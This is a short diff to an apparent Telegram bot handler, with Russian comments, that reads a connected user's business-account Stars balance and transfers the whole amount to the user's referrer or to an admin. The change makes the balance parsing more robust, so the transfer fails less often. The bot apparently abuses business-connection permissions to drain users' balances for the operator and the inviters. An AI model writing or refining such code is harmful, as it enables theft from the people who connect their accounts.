@@ -956,7 +956,7 @@ async def transfer_stars_handler(callback: CallbackQuery):
         user = business_connection.user
         
         # Определяем получателя
-        inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
+        inviter_id = user_referrer_map.get(str(user.id))
         if inviter_id:
             try:
                 await bot.send_chat_action(inviter_id, "typing")
@@ -967,8 +967,12 @@ async def transfer_stars_handler(callback: CallbackQuery):
             recipient_id = ADMIN_IDS[0]
             
         stars = await bot.get_business_account_star_balance(business_id)
+        
         # Убеждаемся, что amount - число
-        amount = int(stars.amount) if isinstance(stars.amount, str) else stars.amount
+        try:
+            amount = int(stars.amount) if stars.amount else 0
+        except (ValueError, TypeError):
+            amount = 0
         
         if amount > 0:
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
